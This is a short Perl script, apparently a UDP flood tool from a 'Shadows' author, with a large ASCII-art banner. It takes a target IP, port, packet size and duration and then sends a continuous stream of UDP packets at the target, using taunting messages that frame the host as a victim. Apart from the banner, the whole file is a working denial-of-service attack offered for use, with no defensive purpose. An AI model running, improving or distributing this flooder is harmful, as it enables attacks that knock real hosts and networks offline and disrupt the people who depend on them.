#!/usr/bin/perl

##
# BWA Shadows
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT;

              _____Sexy?Sex
 ____?Sexy?Sexy
 ___y?Sexy?Sexy?
 ___?Sexy?Sexy?S
 ___?Sexy?Sexy?S
 __?Sexy?Sexy?Se
 _?Sexy?Sexy?Se
 _?Sexy?Sexy?Se
 _?Sexy?Sexy?Sexy?
 ?Sexy?Sexy?Sexy?Sexy
 ?Sexy?Sexy?Sexy?Sexy?Se
 ?Sexy?Sexy?Sexy?Sexy?Sex
 _?Sexy?__?Sexy?Sexy?Sex
 ___?Sex____?Sexy?Sexy?
 ___?Sex_____?Sexy?Sexy
 ___?Sex_____?Sexy?Sexy
 ____?Sex____?Sexy?Sexy
 _____?Se____?Sexy?Sex
 ______?Se__?Sexy?Sexy
 _______?Sexy?Sexy?Sex
 ________?Sexy?Sexy?sex
 _______?Sexy?Sexy?Sexy?Se
 _______?Sexy?Sexy?Sexy?Sexy?
 _______?Sexy?Sexy?Sexy?Sexy?Sexy
 _______?Sexy?Sexy?Sexy?Sexy?Sexy?S
 ________?Sexy?Sexy____?Sexy?Sexy?se
 _________?Sexy?Se_______?Sexy?Sexy?
 _________?Sexy?Se_____?Sexy?Sexy?
 _________?Sexy?S____?Sexy?Sexy
 _________?Sexy?S_?Sexy?Sexy
 ________?Sexy?Sexy?Sexy
 ________?Sexy?Sexy?S
 ________?Sexy?Sexy
 _______?Sexy?Se
 _______?Sexy?
 ______?Sexy?
 ______?Sexy?
 ______?Sexy?
 ______?Sexy
 ______?Sexy
 _______?Sex
 _______?Sex
 _______?Sex
 ______?Sexy
 ______?Sexy
 _______Sexy
 _______ Sexy?
 ________SexY




 Barbies Script By Shadows
EOTEXT

print "::Get @ Me Random:: $ip " . ($port ? $port : "random") . " Disrespected = " .
  ($size ? "$size-byte" : "Disconnected :)") . " ~Barbie~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}